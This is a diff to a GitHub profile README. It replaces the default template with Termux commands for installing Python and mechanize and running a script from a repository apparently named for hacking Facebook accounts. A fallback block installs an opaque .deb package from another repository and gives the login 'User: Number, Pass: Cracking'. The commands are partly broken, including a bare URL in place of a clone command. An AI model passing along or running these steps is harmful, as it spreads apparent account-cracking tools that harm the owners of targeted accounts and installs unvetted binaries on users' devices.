@@ -1,10 +1,19 @@
-- 👋 Hi, I’m @Mujahid4861
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
+$ pkg update
+& pkg upgrade
+$ pkg install python
+$ pkg install python2
+$ pip install requests
+$ pip install mechanize
+$ pkg install git
+$ https://github.com/mujahid4861/Fbhackers-maje
+$ cd Fbhackers-maje
+$ python2 Fbhackers-maje .py
 
-<!---
-Mujahid4861/Mujahid4861 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+If is not working use this
+
+$ git clone https://github.com/James404-cyber/Number.git
+$ cd Number
+$ dpkg -i Speed*.deb
+$ Speed
+User: Number
+Pass:Cracking
